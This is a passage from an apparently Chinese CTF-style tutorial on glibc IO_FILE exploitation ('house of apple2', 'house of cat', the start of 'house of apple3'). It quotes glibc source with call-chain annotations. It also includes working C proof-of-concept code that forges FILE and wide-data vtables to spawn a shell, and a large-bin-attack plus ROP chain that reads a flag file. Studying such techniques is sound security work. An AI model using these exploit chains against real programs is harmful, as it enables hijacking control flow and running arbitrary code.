class="number">1</span>;</span><br><span class="line">    fake_FILE-&gt;_IO_write_base = (<span class="type">char</span>*)<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    fake_FILE-&gt;_IO_read_ptr = (<span class="type">char</span>*)<span class="number">0</span>;</span><br><span class="line">    fake_FILE-&gt;_IO_read_end = (<span class="type">char</span>*)<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    ((<span class="type">size_t</span>*)fake_FILE)[<span class="number">0xD8</span> / <span class="number">8</span>] = libc_base + <span class="number">0x216000</span>; <span class="comment">// vtable</span></span><br><span class="line">    fake_FILE-&gt;_wide_data = fake_wide_data;</span><br><span class="line">    ((<span class="type">size_t</span>*)fake_FILE-&gt;_wide_data)[<span class="number">0xE0</span> / <span class="number">8</span>] = (<span class="type">size_t</span>)fake_vtable;   <span class="comment">// _wide_data-&gt;_wide_vtable</span></span><br><span class="line">    fake_vtable[<span class="number">0x68</span> / <span class="number">8</span>] = (<span class="type">size_t</span>)system;     <span class="comment">// _IO_WDOALLOCATE调用的函数指针，偏移量可通过查看汇编获取</span></span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="type">char</span>*)fake_FILE, binsh);</span><br><span class="line">    *(_IO_list_all) = (<span class="type">size_t</span>)fake_FILE;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="利用-IO-wdefault-xsgetn函数控制程序执行流"><a href="#利用-IO-wdefault-xsgetn函数控制程序执行流" class="headerlink" title="利用_IO_wdefault_xsgetn函数控制程序执行流"></a>利用<code>_IO_wdefault_xsgetn</code>函数控制程序执行流</h2><p>这条链执行的条件是调用到_IO_wdefault_xsgetn时rdx寄存器，也就是第三个参数不为<code>0</code>。如果不满足这个条件，可选用其他链。</p>
<h3 id="相关配置-2"><a href="#相关配置-2" class="headerlink" title="相关配置"></a><strong>相关配置</strong></h3><p>对<code>_IO_FILE_plus</code>的设置如下：</p>
<ul>
<li><code>_flags</code>设置为<code>0x800</code></li>
<li><code>vtable</code>设置为<code>_IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps</code>地址（加减偏移），使其能成功调用<code>_IO_wdefault_xsgetn</code>即可。</li>
<li><code>_mode</code>设置为大于<code>0</code>，即满足<code>*(fp + 0xc0) &gt; 0</code></li>
<li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_read_end == _wide_data-&gt;_IO_read_ptr</code>设置为<code>0</code>，即满足<code>*(A + 8) = *A</code></li>
<li><code>_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</code>，即满足<code>*(A + 0x20) &gt; *(A + 0x18)</code></li>
<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;overflow</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x18) = C</code></li>
</ul>
<h3 id="函数调用链-2"><a href="#函数调用链-2" class="headerlink" title="函数调用链"></a><strong>函数调用链</strong></h3><p><code>_IO_wdefault_xsgetn-&gt;__wunderflow-&gt;_IO_switch_to_wget_mode-&gt;_IO_WOVERFLOW-&gt;*(fp-&gt;_wide_data-&gt;_wide_vtable + 0x18)(fp)</code></p>
<p>详解：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_wdefault_xsgetn (FILE *fp, <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* more 为第三个参数，即 rdx。*/</span></span><br><span class="line">  <span class="type">size_t</span> more = n;</span><br><span class="line">  <span class="type">wchar_t</span> *s = (<span class="type">wchar_t</span>*) data;</span><br><span class="line">  <span class="keyword">for</span> (;;)</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="comment">/* Data available. */</span></span><br><span class="line">      <span class="type">ssize_t</span> count = (fp-&gt;_wide_data-&gt;_IO_read_end</span><br><span class="line">                       - fp-&gt;_wide_data-&gt;_IO_read_ptr);</span><br><span class="line">      <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">	  &#123;</span><br><span class="line">	    <span class="keyword">if</span> ((<span class="type">size_t</span>) count &gt; more)</span><br><span class="line">	      count = more;</span><br><span class="line">	    <span class="keyword">if</span> (count &gt; <span class="number">20</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      s = __wmempcpy (s, fp-&gt;_wide_data-&gt;_IO_read_ptr, count);</span><br><span class="line">	      fp-&gt;_wide_data-&gt;_IO_read_ptr += count;</span><br><span class="line">	    &#125;</span><br><span class="line">	    <span class="keyword">else</span> <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">	      count = <span class="number">0</span>;</span><br><span class="line">	    <span class="keyword">else</span></span><br><span class="line">	    &#123;</span><br><span class="line">	       <span class="type">wchar_t</span> *p = fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line">	       <span class="type">int</span> i = (<span class="type">int</span>) count;</span><br><span class="line">	       <span class="keyword">while</span> (--i &gt;= <span class="number">0</span>)</span><br><span class="line">		     *s++ = *p++;</span><br><span class="line">	       fp-&gt;_wide_data-&gt;_IO_read_ptr = p;</span><br><span class="line">         &#125;</span><br><span class="line">         more -= count;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">/* 首先判断第三个参数 rdx 是否为 0，我们需要他进行第二个判断 */</span></span><br><span class="line">      <span class="keyword">if</span> (more == <span class="number">0</span> || __wunderflow (fp) == WEOF)</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> n - more;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">wint_t</span></span><br><span class="line">__wunderflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* _mode &gt; 0 */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode &lt; <span class="number">0</span> || (fp-&gt;_mode == <span class="number">0</span> &amp;&amp; _IO_fwide (fp, <span class="number">1</span>) != <span class="number">1</span>))</span><br><span class="line">     <span class="keyword">return</span> WEOF;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode == <span class="number">0</span>)</span><br><span class="line">    _IO_fwide (fp, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_put_mode (fp))</span><br><span class="line">    <span class="keyword">if</span> (_IO_switch_to_wget_mode (fp) == EOF) <span class="comment">// 调用这里</span></span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_backup (fp))</span><br><span class="line">  &#123;</span><br><span class="line">      _IO_switch_to_main_wget_area (fp);</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">	<span class="keyword">return</span> *fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (_IO_have_markers (fp))</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">save_for_wbackup</span> (fp, fp-&gt;_wide_data-&gt;_IO_read_end))</span><br><span class="line">		<span class="keyword">return</span> WEOF;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (_IO_have_backup (fp))</span><br><span class="line">    _IO_free_wbackup_area (fp);</span><br><span class="line">  <span class="keyword">return</span> _IO_UNDERFLOW (fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_switch_to_wget_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* 需要 _wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF) <span class="comment">// 调用 _IO_WOVERFLOW</span></span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_backup (fp))</span><br><span class="line">    fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_backup_base;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_buf_base;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">		  fp-&gt;_wide_data-&gt;_IO_read_end = fp-&gt;_wide_data-&gt;_IO_write_ptr;</span><br><span class="line">  &#125;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_read_ptr = fp-&gt;_wide_data-&gt;_IO_write_ptr;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_base = fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">    = fp-&gt;_wide_data-&gt;_IO_write_end = fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_flags &amp;= ~_IO_CURRENTLY_PUTTING;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="poc-2"><a href="#poc-2" class="headerlink" title="poc"></a><strong>poc</strong></h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* binsh = <span class="string">&quot;sh&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">size_t</span> puts_addr = (<span class="type">size_t</span>)&amp;puts;</span><br><span class="line">    <span class="type">size_t</span> libc_base = puts_addr - <span class="number">0x80ed0</span>;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_IO_FILE</span>* fake_FILE = (<span class="keyword">struct</span> _IO_FILE*) <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    <span class="type">size_t</span>* fake_vtable = (<span class="type">size_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_IO_wide_data</span>* fake_wide_data = (<span class="keyword">struct</span> _IO_wide_data*)<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="type">size_t</span>* _IO_list_all = (<span class="type">size_t</span>*)(libc_base + <span class="number">0x21A680</span>);</span><br><span class="line"></span><br><span class="line">    fake_FILE-&gt;_mode = <span class="number">1</span>;</span><br><span class="line">    fake_FILE-&gt;_wide_data = fake_wide_data;</span><br><span class="line">    ((<span class="type">size_t</span>*)fake_FILE)[<span class="number">0xD8</span> / <span class="number">8</span>] = libc_base + <span class="number">0x215A00</span> + <span class="number">0x3C0</span> + <span class="number">0x40</span> - <span class="number">0x18</span>; <span class="comment">// _IO_wstrn_jumps</span></span><br><span class="line">    ((<span class="type">size_t</span>*)fake_FILE-&gt;_wide_data)[<span class="number">0xE0</span> / <span class="number">8</span>] = (<span class="type">size_t</span>)fake_vtable;   <span class="comment">// _wide_data-&gt;_wide_vtable</span></span><br><span class="line">    ((<span class="type">size_t</span>*)fake_FILE-&gt;_wide_data)[<span class="number">0x20</span> / <span class="number">8</span>] = <span class="number">1</span>;     <span class="comment">// _wide_data-&gt;_IO_write_ptr, o+0x20</span></span><br><span class="line">    fake_vtable[<span class="number">0x18</span> / <span class="number">8</span>] = (<span class="type">size_t</span>)system;     <span class="comment">// _IO_WOVERFLOW调用的函数指针</span></span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="type">char</span>*)fake_FILE, binsh);   <span class="comment">// sh =&gt; 0x6873, 0x6873 &amp; 0x800 != 0</span></span><br><span class="line"></span><br><span class="line">    *(_IO_list_all) = (<span class="type">size_t</span>)fake_FILE;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="house-of-cat"><a href="#house-of-cat" class="headerlink" title="house of cat"></a><a class="link"   href="https://bbs.kanxue.com/thread-273895.htm" >house of cat <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h1><p> <code>house of apple2</code> 的一条路线之一。</p>
<h2 id="利用-IO-wfile-seekoff函数控制程序执行流"><a href="#利用-IO-wfile-seekoff函数控制程序执行流" class="headerlink" title="利用_IO_wfile_seekoff函数控制程序执行流"></a>利用_IO_wfile_seekoff函数控制程序执行流</h2><h3 id="相关配置-3"><a href="#相关配置-3" class="headerlink" title="相关配置"></a>相关配置</h3><p>对 <code>_IO_FILE_plus</code> 的设置如下：</p>
<ul>
<li><code>_flags</code> 设置为 <code>~0x8</code>，如果不能保证 <code>_lock</code> 指向可读写内存则 <code>_flags |= 0x8000</code>。</li>
<li><code>vtable</code>设置为<code>_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_seekoff</code>即可</li>
<li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</code> ，即满足<code>*A &gt; *(A + 8)</code></li>
<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;overflow</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x18) = C</code></li>
</ul>
<h3 id="函数调用链-3"><a href="#函数调用链-3" class="headerlink" title="函数调用链"></a>函数调用链</h3><p><code>_IO_wfile_seekoff-&gt;_IO_switch_to_wget_mode-&gt;_IO_WOVERFLOW-&gt;*(fp-&gt;_wide_data-&gt;_wide_vtable + 0x18)(fp)</code></p>
<p>详解：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">off64_t</span></span><br><span class="line">_IO_wfile_seekoff (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir, <span class="type">int</span> mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">off64_t</span> result;</span><br><span class="line">  <span class="type">off64_t</span> delta, new_offset;</span><br><span class="line">  <span class="type">long</span> <span class="type">int</span> count;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Short-circuit into a separate function.  We don&#x27;t want to mix any</span></span><br><span class="line"><span class="comment">     functionality and we don&#x27;t want to touch anything inside the FILE</span></span><br><span class="line"><span class="comment">     object. */</span></span><br><span class="line">  <span class="keyword">if</span> (mode == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">do_ftell_wide</span> (fp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* POSIX.1 8.2.3.7 says that after a call the fflush() the file</span></span><br><span class="line"><span class="comment">     offset of the underlying file must be exact.  */</span></span><br><span class="line">  <span class="type">int</span> must_be_exact = ((fp-&gt;_wide_data-&gt;_IO_read_base</span><br><span class="line">			== fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">		       &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_base</span><br><span class="line">			   == fp-&gt;_wide_data-&gt;_IO_write_ptr));</span><br><span class="line"></span><br><span class="line">  <span class="type">bool</span> was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">		       &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">		      || _IO_in_put_mode (fp));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (was_writing &amp;&amp; _IO_switch_to_wget_mode (fp))</span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">[...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_switch_to_wget_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* 需要 _wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF) <span class="comment">// 调用 _IO_WOVERFLOW</span></span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_backup (fp))</span><br><span class="line">    fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_backup_base;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_buf_base;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">		  fp-&gt;_wide_data-&gt;_IO_read_end = fp-&gt;_wide_data-&gt;_IO_write_ptr;</span><br><span class="line">  &#125;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_read_ptr = fp-&gt;_wide_data-&gt;_IO_write_ptr;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_base = fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">    = fp-&gt;_wide_data-&gt;_IO_write_end = fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_flags &amp;= ~_IO_CURRENTLY_PUTTING;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="POC-6"><a href="#POC-6" class="headerlink" title="POC"></a>POC</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ucontext.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">//leak libc_base</span></span><br><span class="line">    <span class="type">size_t</span> puts_addr = (<span class="type">size_t</span>) &amp;puts;</span><br><span class="line">    <span class="type">size_t</span> libc_base = puts_addr - <span class="number">0x702e0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// large bin attack: stderr -&gt; large</span></span><br><span class="line">    <span class="type">size_t</span> stderr_addr = libc_base + <span class="number">0x3b87a0</span>;</span><br><span class="line">    <span class="type">size_t</span> *large = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">    <span class="type">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(buf, <span class="string">&quot;./flag&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> *unsorted = <span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br><span class="line">    <span class="built_in">free</span>(large);</span><br><span class="line">    <span class="type">size_t</span> *payload = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">free</span>(unsorted);</span><br><span class="line">    large[<span class="number">3</span>] = stderr_addr - <span class="number">0x20</span>;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> IO_wfile_jumps_addr = libc_base + <span class="number">0x3b3f40</span>;</span><br><span class="line">    <span class="comment">// mov rdx, [rdi+0x8]; mov [rsp], rax; call qword ptr [rdx+0x20]</span></span><br><span class="line">    <span class="type">size_t</span> magic_gadget = libc_base + <span class="number">0x121a90</span>; </span><br><span class="line">    <span class="type">size_t</span> pop_rax_ret = libc_base + <span class="number">0x3aaa8</span>;</span><br><span class="line">    <span class="type">size_t</span> pop_rdi_ret = libc_base + <span class="number">0x23256</span>;</span><br><span class="line">    <span class="type">size_t</span> pop_rsi_ret = libc_base + <span class="number">0x2d89f</span>;</span><br><span class="line">    <span class="type">size_t</span> syscall_ret = libc_base + <span class="number">0x3ac69</span>;</span><br><span class="line">    <span class="type">size_t</span> ret = pop_rax_ret + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// fake file</span></span><br><span class="line">    large[<span class="number">-2</span>] &amp;= ~<span class="number">0x8</span>; <span class="comment">// _flags &amp;= ~0x8</span></span><br><span class="line">    large[<span class="number">-1</span>] = (<span class="type">size_t</span>) payload;</span><br><span class="line">    large[<span class="number">25</span>] = IO_wfile_jumps_addr + <span class="number">0x10</span>; <span class="comment">// vtable -&gt; _IO_wfile_jumps + 0x10</span></span><br><span class="line">    large[<span class="number">15</span>] = (<span class="type">size_t</span>) unsorted; <span class="comment">// _lock -&gt; rw memory</span></span><br><span class="line">    large[<span class="number">18</span>] = (<span class="type">size_t</span>) unsorted;<span class="comment">// _wide_data</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// fake _wide_data</span></span><br><span class="line">    unsorted[<span class="number">4</span>] = (<span class="type">size_t</span>) (<span class="number">-1</span>); <span class="comment">//_IO_write_ptr</span></span><br><span class="line">    unsorted[<span class="number">28</span>] = (<span class="type">size_t</span>) unsorted; <span class="comment">//_wide_vtable</span></span><br><span class="line">    unsorted[<span class="number">3</span>] = (<span class="type">size_t</span>) magic_gadget;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// SigreturnFrame</span></span><br><span class="line">    payload[<span class="number">4</span>] = (<span class="type">size_t</span>) setcontext + <span class="number">53</span>;</span><br><span class="line">    payload[<span class="number">13</span>] = (<span class="type">size_t</span>) buf; <span class="comment">// rdi -&gt; &quot;./flag&quot;</span></span><br><span class="line">    payload[<span class="number">14</span>] = <span class="number">0</span>; <span class="comment">// rsi = 0</span></span><br><span class="line">    payload[<span class="number">17</span>] = <span class="number">0x100</span>; <span class="comment">// rdx = 0x100 read 0x100 bytes</span></span><br><span class="line">    payload[<span class="number">20</span>] = (<span class="type">size_t</span>) &amp;payload[<span class="number">31</span>]; <span class="comment">// rsp -&gt; fake stack</span></span><br><span class="line">    payload[<span class="number">21</span>] = ret; <span class="comment">// rip -&gt; ret;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// rop</span></span><br><span class="line">    payload[<span class="number">31</span>] = pop_rax_ret;</span><br><span class="line">    payload[<span class="number">32</span>] = <span class="number">2</span>;</span><br><span class="line">    payload[<span class="number">33</span>] = syscall_ret;</span><br><span class="line">    payload[<span class="number">34</span>] = pop_rax_ret;</span><br><span class="line">    payload[<span class="number">35</span>] = <span class="number">0</span>;</span><br><span class="line">    payload[<span class="number">36</span>] = pop_rdi_ret;</span><br><span class="line">    payload[<span class="number">37</span>] = <span class="number">3</span>;</span><br><span class="line">    payload[<span class="number">38</span>] = pop_rsi_ret;</span><br><span class="line">    payload[<span class="number">39</span>] = (<span class="type">size_t</span>) buf;</span><br><span class="line">    payload[<span class="number">40</span>] = syscall_ret;</span><br><span class="line">    payload[<span class="number">41</span>] = pop_rax_ret;</span><br><span class="line">    payload[<span class="number">42</span>] = <span class="number">1</span>;</span><br><span class="line">    payload[<span class="number">43</span>] = pop_rdi_ret;</span><br><span class="line">    payload[<span class="number">44</span>] = <span class="number">1</span>;</span><br><span class="line">    payload[<span class="number">45</span>] = pop_rsi_ret;</span><br><span class="line">    payload[<span class="number">46</span>] = (<span class="type">size_t</span>) buf;</span><br><span class="line">    payload[<span class="number">47</span>] = syscall_ret;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// __malloc_assert</span></span><br><span class="line">    <span class="type">size_t</span> *top_chunk_addr = unsorted + <span class="number">0x124</span>;</span><br><span class="line">    top_chunk_addr[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="house-of-apple3"><a href="#house-of-apple3" class="headerlink" title="house of apple3"></a><a class="link"   href="https://bbs.kanxue.com/thread-273863.htm#msg_header_h2_1" >house of apple3 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h1><p><strong>前置条件</strong></p>
<p>如果<code>_wide_data</code>设置不当的话会影响某些利用链的分支走向。但采用默认的<code>_wide_data</code>成员（默认会指向<code>_IO_wide_data_2</code>，除了<code>_wide_vtable</code>外其他成员均默认为<code>0</code>），也并不影响<code>house of apple3</code>的利用。因此，如果能伪造整个<code>FILE</code>结构体，则需要设置合适的<code>_wide_data</code>；如果只能伪部分<code>FILE</code>的成员的话，保持<code>fp-&gt;_wide_data</code>为默认地址即可。</p>
<ul>
<li>已知<code>heap</code>地址和<code>glibc</code>地址</li>
<li>能控制程序执行<code>IO</code>操作，包括但不限于：从<code>main</code>函数返回、调用<code>exit</code>函数、通过<code>__malloc_assert</code>触发</li>
<li>能控制<code>_IO_FILE</code>的<code>vtable</code>和<code>_codecvt</code>，一般使用<code>largebin attack</code>去控制</li>
</ul>
<h2 id="原理-7"><a href="#原理-7" class="headerlink" title="原理"></a>原理</h2><p><code>FILE</code>结构体中有一个成员<code>struct _IO_codecvt *_codecvt;</code>，偏移为<code>0x98</code>。该结构体参与宽字符的转换工作，结构体相关定义如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_codecvt</span></span><br><span class="line">&#123;</span><br><span class="line">  _IO_iconv_t __cd_in;</span><br><span class="line">  _IO_iconv_t __cd_out;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">__gconv_step</span> *step;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">__gconv_step_data</span> step_data;</span><br><span class="line">&#125; _IO_iconv_t;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">__gconv_step</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">__gconv_loaded_object</span> *__shlib_handle; <span class="comment">// 关注这个成员</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *__modname;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* For internal use by glibc.  (Accesses to this member must occur</span></span><br><span class="line"><span class="comment">     when the internal __gconv_lock mutex is acquired).  */</span></span><br><span class="line">  <span class="type">int</span> __counter;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> *__from_name;</span><br><span class="line">  <span class="type">char</span> *__to_name;</span><br><span class="line"></span><br><span class="line">  __gconv_fct __fct;</span><br><span class="line">  __gconv_btowc_fct __btowc_fct;</span><br><span class="line">  __gconv_init_fct __init_fct;</span><br><span class="line">  __gconv_end_fct __end_fct;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Information about the number of bytes needed or produced in this</span></span><br><span class="line"><span class="comment">     step.  This helps optimizing the buffer sizes.  */</span></span><br><span class="line">  <span class="type">int</span> __min_needed_from;</span><br><span class="line">  <span class="type">int</span> __max_needed_from;</span><br><span class="line">  <span class="type">int</span> __min_needed_to;</span><br><span class="line">  <span class="type">int</span> __max_needed_to;</span><br><span 